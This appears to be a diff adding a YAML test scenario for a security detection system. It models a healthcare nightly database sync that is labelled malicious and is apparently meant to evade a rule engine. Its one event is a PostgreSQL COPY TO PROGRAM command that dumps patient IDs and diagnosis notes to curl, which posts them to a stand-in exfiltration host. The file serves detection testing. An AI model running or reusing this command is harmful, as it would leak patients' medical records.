@@ -1,0 +1,21 @@
+scenario_id: hc2_copyprog_pair1_mal
+family_id: healthcare_copyprog_nightly_sync
+domain: healthcare
+matched_pair_id: healthcare_copyprog_pair1
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "22:15"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  - session_label: nightly_sync
+    role: research_etl_service
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [5.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT patient_id, diagnosis_notes FROM medical_records) TO PROGRAM 'curl -sX POST https://exfil.research-mirror.example/collect -d @-'"
+        connects_to: {ip: "193.42.33.17", port: 8080}
